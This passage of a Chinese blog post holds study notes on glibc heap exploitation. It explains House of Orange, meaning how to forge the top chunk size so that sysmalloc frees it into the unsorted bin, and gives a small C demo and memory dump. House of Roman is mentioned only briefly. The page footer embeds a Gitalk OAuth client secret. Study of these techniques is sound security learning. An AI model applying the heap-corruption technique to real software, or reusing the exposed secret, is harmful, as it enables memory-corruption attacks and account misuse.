class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602000</span></span><br><span class="line"><span class="comment">(0x030)  smallbin[ 1]: 0x602060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>主要在top chunk做文章。核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)</p>
<p>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>在malloc时当检测到所有的bin都不合要求后会尝试使用top chunk，当top chunk也不符合要求时，执行 sysmalloc 来向系统申请更多的空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于堆来说有 mmap 和 brk 两种分配方式，需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>要实现这个目的需要绕过一些 libc 中的 check</p>
<ul>
<li><p>malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<ul>
<li>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查了 top chunk 的合法性</p>
<ul>
<li>伪造的 size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>进入 unsorted bin </p>
<p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0xfe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上一个chunk修改top chunk的size，来对top chunk的size进行伪造。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;&#x3D;&#x3D; top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>需要注意对齐，此时top chunk在0x602020,要满足0x1000(4k)对齐，size只能是0xfe1/0x1fe1等。</p>
<p>之后top chunk被放入unsorted bin，下一次申请时会分割这个chunk。</p>
<p><strong>利用涉及到_IO_FILE 的知识</strong>(?)</p>
<h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>按照ctf-wiki所说，其实是 fastbin attack 和 Unsortbin attack 结合的一个小trick，当下没太看懂，日后再说。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/06/12/v8Config/" rel="prev" title="V8配置与常用调试">
                  <i class="fa fa-chevron-left"></i> V8配置与常用调试
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/06/19/v8TurboFan/" rel="next" title="V8中Speculative Optimization简介">
                  V8中Speculative Optimization简介 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
  
  
  



      
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ma5ker</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">265k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:01</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  















  








  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.css">

<script>
NexT.utils.loadComments('#gitalk-container', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '0530768cd3819c29f055',
      clientSecret: '9465920674abd65e54adf115c57771a78911b8f4',
      repo        : 'blog-comments',
      owner       : 'Ma5ker',
      admin       : ['Ma5ker'],
      id          : 'de5450563ff7ca5c753278579aad5021',
        language: '',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":85,"height":200,"hOffset":60,"vOffset":40},"mobile":{"show":true,"scale":0.3,"motion":true},"neat_enable":true,"neat_html":{"enable":true,"exclude":null},"neat_css":{"enable":true,"exclude":["**/*.min.css"]},"neat_js":{"enable":true,"mangle":true,"output":null,"compress":null,"exclude":["**/*.min.js","**/jquery.fancybox.pack.js","**/index.js","**/love.js"]},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
